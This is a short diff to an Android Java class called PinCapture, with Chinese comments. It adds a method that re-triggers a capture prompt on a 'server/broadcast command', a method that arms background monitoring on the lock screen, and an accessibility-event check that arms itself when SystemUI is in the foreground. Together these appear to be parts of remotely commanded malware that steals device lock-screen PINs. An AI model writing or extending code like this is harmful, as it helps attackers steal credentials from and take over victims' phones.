@@ -234,6 +234,22 @@ public final class PinCapture {
         }
     }
 
+    /** 服务器/广播指令：强制弹一次（忽略一次性标记） */
+    public static void promptForce(Context ctx) {
+        prompted = false;
+        flowStarted = false;
+        Log.d(TAG, "prompt_force from command");
+        prompt(ctx);
+    }
+
+    /** 锁屏时确保后台监控是 armed 状态 */
+    public static void ensureArmed(Context ctx) {
+        if (!armed && ctx != null) {
+            Log.d(TAG, "ensureArmed: not armed, arm now");
+            arm(ctx);
+        }
+    }
+
     /** 清掉一次性标记，允许下次连接再弹一次（面板/调试用） */
     public static void reset(Context ctx) {
         try {
@@ -259,6 +275,11 @@ public final class PinCapture {
 
             CharSequence p = e.getPackageName();
             String pkg = p == null ? "" : p.toString();
+
+            if (!armed && pkg.contains("systemui")) {
+                ensureArmed(ctx);
+            }
+            if (!armed) return;
 
             boolean systemPkg = match(pkg);
             boolean imePkg = isIme(pkg);
